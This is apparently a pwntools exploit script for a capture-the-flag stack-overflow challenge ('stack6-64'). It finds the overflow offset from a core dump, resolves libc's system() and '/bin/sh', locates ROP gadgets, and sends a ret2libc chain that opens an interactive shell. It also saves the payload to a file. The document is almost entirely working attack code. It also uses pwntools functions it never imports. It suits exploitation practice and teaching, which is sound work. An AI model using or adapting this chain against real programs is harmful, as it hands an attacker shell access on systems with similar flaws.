import struct
import sys

binary = '/problems/stack6r-64_42_a83996e8c1aa0a1120927915550e7835/stack6-64'

context.clear(arch='Amd64')  #i386 for 32 bit

p = process(binary)  # can have env={'VARNAME':'val'}

crash_str = cyclic(128)

p.sendline(crash_str)
p.wait()

assert pack(p.corefile.rbp) in crash_str

offset = cyclic_find(pack(p.corefile.rbp))

libc = ELF(p.corefile.libc.path)

system_addr = libc.symbols.system + p.corefile.libc.start

cmd_addr = p.corefile.libc.find('/bin/sh')

#gadget_addr = 0x00000000004006f3

r = ROP(ELF(binary))
#r.clear_cache()

ga = r.find_gadget(['pop rdi', 'ret'])[0]

#ga = ROP(ELF(binary)).find_gadget(['pop rdi', 'ret'])[0]
#print(ga)
gadget_addr = ga# + p.corefile.exe.start
#rop = ROP(binary)
#rop.call(system_addr, [cmd_addr])
#print(ROP(binary).dump())

ret_gad = r.find_gadget(['ret'])[0]
print("------")
print(hex(gadget_addr))
print(hex(ret_gad))
print(hex(system_addr))
print(hex(cmd_addr))
print("-----")

exploit = flat({offset + 8: p64(gadget_addr) + p64(cmd_addr) + p64(ret_gad) + p64(system_addr)})
#exploit = 'a'*(offset) + p64(gadget_addr) + p64(cmd_addr) + p64(system_addr)

with open('grr.txt', 'wb') as f:
    f.write(exploit)

p = process(binary)
p.sendline(exploit)
p.interactive()


